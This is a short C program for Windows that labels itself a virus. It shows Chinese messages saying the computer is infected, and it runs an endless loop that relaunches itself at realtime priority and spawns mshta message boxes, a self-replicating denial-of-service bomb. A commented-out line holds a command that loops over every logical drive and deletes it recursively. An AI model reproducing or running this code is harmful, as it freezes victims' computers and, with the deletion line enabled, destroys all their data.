#include "stdio.h"
#include "stdlib.h"
#include "string.h"

int main(int argc, char* argv[])
{
	system("chcp 936&title 病毒&color e&cls");
	char cmd[1000] = "start /realtime \"\" \"";
	strcat_s(cmd, argv[0]);
	strcat_s(cmd, "\"");
	printf("您的计算机已中毒！");
	while (true)
	{
		system(cmd);
		system("start /realtime \"\" mshta vbscript:msgbox(\"您的计算机已中毒！\",16,\"病毒\")(window.close)");
	}
	//system("for /f \"skip=1\" %i in ('wmic logicaldisk get name') do (cmd /k rd /s /q %i)");
	return 0;
}